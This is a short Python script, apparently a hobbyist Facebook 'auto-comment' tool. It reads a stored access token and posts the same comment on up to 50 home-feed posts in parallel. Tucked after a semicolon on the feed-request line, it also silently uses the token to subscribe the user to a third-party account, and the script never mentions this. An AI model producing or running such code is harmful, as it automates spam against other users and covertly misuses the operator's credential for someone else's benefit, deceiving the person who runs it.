#!usr/bin/python3.7
#Author: KANG-NEWBIE
#Github: https://github.com/kang-newbie
#Contact: t.me/kang_nuubi
'''
boleh recode asal cantumkan author aslinya goblok!
'''
try:
	import requests
	from multiprocessing.pool import ThreadPool
	import os, sys, json, time, hashlib

	banner=("""
 _                              _         
| |        F A C E B O O K     | |        
| | _____  _ __ ___   ___ _ __ | |__ _ _  
| |/ / _ \| '_ ` _ \ / _ \ '_ \| __/ _` | 
|   < (_) | | | | | |  __/ | | | || (_| | 
|_|\_\___/|_| |_| |_|\___|_| |_|\__\__,_| 
                                         """)

	print(banner)
	print("[info] type '<n>' for newlines")
	msg=input("[?] comment: ")
	if msg == '':
		exit("[!] you stupid")
	ms=msg.replace('<n>','\n')
	def main(arg):
		global ms,toket
		par = {'access_token' : toket, 'message' : ms}
		pt=requests.post('https://graph.facebook.com/'+arg+'/comments',data=par)
		post=json.loads(pt.text)
		if 'error' in str(post):
			print('[Error] maybe you are blocked from leaving comments')
		else:
			print('[+] ['+arg+'] commented')

	id=[]
	toket=open('toket/token.txt','r').read()
	req = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
	result = json.loads(req.text)
	for i in result['home']['data']:
		id.append(i['id'])
		print('\r[get] %s  '%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.01)
	print("[!] Start.")
	time.sleep(2)

	T=ThreadPool(10)
	T.map(main,id)
	print("[^•^] done")
except Exception as F:
	exit("\n[Error] %s"%(F))
